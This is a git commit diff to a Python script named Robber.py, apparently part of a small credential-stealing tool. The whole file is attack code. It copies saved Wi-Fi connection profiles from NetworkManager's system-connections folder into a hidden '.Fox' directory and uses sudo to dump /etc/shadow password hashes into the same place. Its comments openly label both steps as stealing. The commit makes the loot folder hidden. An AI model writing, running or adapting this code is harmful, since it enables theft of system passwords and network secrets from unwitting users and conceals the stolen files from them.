5e43722183cc71a085a2156df4d44a27b1200494
Mr-Fox-h <mr.fox@iran.ir>
2022-01-04 00:21:04 -1100

    38 commit

--- Linux/Robber.py
+++ Linux/Robber.py
@@ -1,12 +1,12 @@
 import os
 import shutil
 
-### Steal Linux Password ###
-os.system("sudo cat /etc/shadow > Fox.txt")
 ### Steal WIFI On Linux ###
 files = os.listdir("/etc/NetworkManager/system-connections/")
-os.mkdir("Fox")
+os.mkdir(".Fox")
 num = 1
 for line in files:
-    shutil.copy2("/etc/NetworkManager/system-connections/" + line, "Fox/Fox_done-" + str(num) + ".txt")
+    shutil.copy2("/etc/NetworkManager/system-connections/" + line, ".Fox/WIFI-" + str(num) + ".txt")
     num += 1
+### Steal Linux Password ###
+os.system("sudo cat /etc/shadow > .Fox/OS_Pass.txt")
